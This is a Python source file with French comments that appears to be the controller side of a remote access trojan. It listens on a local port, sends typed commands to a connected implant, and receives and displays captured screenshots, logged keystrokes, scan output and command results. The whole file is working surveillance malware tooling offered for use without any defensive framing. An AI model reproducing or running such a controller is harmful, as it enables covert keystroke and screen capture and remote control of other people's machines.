import socket
import threading
from PIL import Image
import time

ip_add = "127.0.0.1"
port = 3280

# Bind and listen socket
def listen_socket(s):
    s.bind((ip_add, port))
    s.listen(5)

# Accepter le socket
def accept_socket(s):
    print(f"Listening on {ip_add}:{port}")
    while True:
        try:
            conn, address = s.accept()
            print(f"New connection from {address}!")
            send_command(conn)
            conn.close()  # Ferme la connexion après l'échange de commandes
        except socket.error:
            time.sleep(5)

# Envoyer une commande
def send_command(conn):
    while True:
        
        command = input("> ")
        conn.send(command.encode("utf-8"))

        if command.lower() == "stop":
            print("Closing connection.")
            conn.close()
            listen_socket(s)
            break

        elif command == "capture":
            receive_screen(conn)

        elif command.startswith("scan"):
            scan_result = conn.recv(4096).decode("utf-8", errors="replace")
            print(scan_result)

        elif command == "keylogger":
            receive_keylogger(conn)
        
        elif command == "help":
            result = conn.recv(1024).decode('utf-8', errors='replace')
            print(result)

        else:
            result = conn.recv(4096).decode("utf-8", errors="replace") # Recoie le résultat
            print(result)  # Affichage du résultat côté serveur
        
# Fonction qui recoit le screenshot
def receive_screen(conn):
    # Recoie la taille de l'image
    size = int.from_bytes(conn.recv(4), 'big')
    width = int.from_bytes(conn.recv(4), 'big')
    height = int.from_bytes(conn.recv(4), 'big')

    # Recoie les données de l'image
    img_data = b""
    while len(img_data) < size:
        img_data += conn.recv(4096)

    img = Image.frombytes("RGB", (width, height), img_data) # Reconstruit l'image et l'affiche
    img.show()

# Keylogger
def receive_keylogger(conn):

    def listen_keys():
        try:
            print("Keylogger started. Receiving data...")
            while True:
                key = conn.recv(1024)
                if not key:
                    print("Keylogger stopped.")
                    break
                print(f"Key: {key.decode('utf-8', errors='replace')}")
        except Exception as e:
            print(f"Error in keylogger: {e}")
    
    # Démarrer le keylogger dans un thread séparé
    keylogger_thread = threading.Thread(target=listen_keys)
    keylogger_thread.daemon = True  # Permet de terminer le thread si le programme principal s'arrête
    keylogger_thread.start()

if __name__ == "__main__":
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen_socket(s)
        accept_socket(s)
    except Exception as e:
        print(f"Server encountered an error: {e}")
    finally:
        s.close()
